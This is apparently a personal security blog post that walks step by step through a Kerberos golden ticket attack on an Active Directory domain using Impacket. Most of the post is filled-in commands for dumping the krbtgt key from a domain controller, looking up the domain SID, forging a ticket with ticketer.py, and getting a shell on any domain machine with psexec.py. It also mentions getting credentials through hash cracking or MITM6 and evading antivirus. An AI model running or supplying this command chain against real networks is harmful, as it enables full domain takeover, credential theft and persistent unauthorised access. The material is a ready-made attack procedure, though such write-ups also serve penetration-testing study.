---
layout: post
title: Golden Ticket Attacks using Impacket
---

After playing about with Mimikatz for a bit and looking at a few options to bypass the anti virus, I decided a different tool might make more sense.
Impacket contains a number of tools that can be used to obtain the krbtg hash and the domain SID, create a golden ticket offline and then obtain a shell using the Kerberos ticket.

> [!NOTE]
> Credentials are needed to run these commands on the domain controller. These can be obtained by cracking NTLM hashes  or running a MITM6 attack.

<br>

<h4> Use secretsdump.py to obtain the aes256 key for the krbtgt account </h4>

``` secretsdump.py domain/user:password dc-ip ``` <br>

``` secretsdump.py home.local/TaMBSZZkfd:'?^kigXF?oG,y{o='@10.0.2.250 ``` <br>

<br>
<h4> Use lookupsid.py to find the domain SID </h4>

``` Lookupsid.py <domain>/<user>:<password> <dc-ip> ``` <br>

``` Lookupsid.py home.local/TaMBSZZkfd:'?^kigXF?oG,y{o='@10.0.2.250 ``` <br>

<br>
<h4> Use ticketer.py to create TGT </h4>

``` ticketer.py -aes <aes-256> -domain-sid <SID> -domain <domain> -user-id <500> username ``` <br>

``` ticketer.py -aes 5735dd8eaf424d966ef640d4056e2eb90310345d58b074103444483bdf736861 -domain-sid S-1-5-21-536825828-3248286720-2276939788 -domain home.local -user-id 500 administrator ``` <br>

<br>
<h4> Export KRB5CCNAME to created ticket location </h4>

``` export KRB5CCNAME=/home/kali/Documents/administrator.ccache ``` <br>

<br>
<h4> Use psexec to obtain a shell on any machine in the domain </h4>

``` psexec.py <domain>/<user>@<hostname>.<fqdn> -no-pass -k ``` <br>

``` psexec.py home.local/administrator@TargetPC.home.local -no-pass -k ``` <br>

